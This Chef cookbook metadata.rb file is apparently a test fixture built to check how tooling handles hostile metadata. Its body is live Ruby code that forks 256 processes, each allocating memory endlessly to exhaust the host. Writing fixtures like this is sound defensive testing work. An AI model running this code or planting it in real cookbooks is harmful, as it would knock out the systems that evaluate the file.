maintainer "RightScale, Inc."
maintainer_email "support@rightscale.com"
description "Test fixture with malicious metadata.rb"
version "1.0.0"

# Attempt to exhaust the machine's memory by performing a bunch of heap allocations
256.times do
  fork do
    strings = []
    loop do
      strings << (rand(10).to_s * 1024)
    end
  end
end

recipe "malicious::default", "Do nothing. With evil intent."

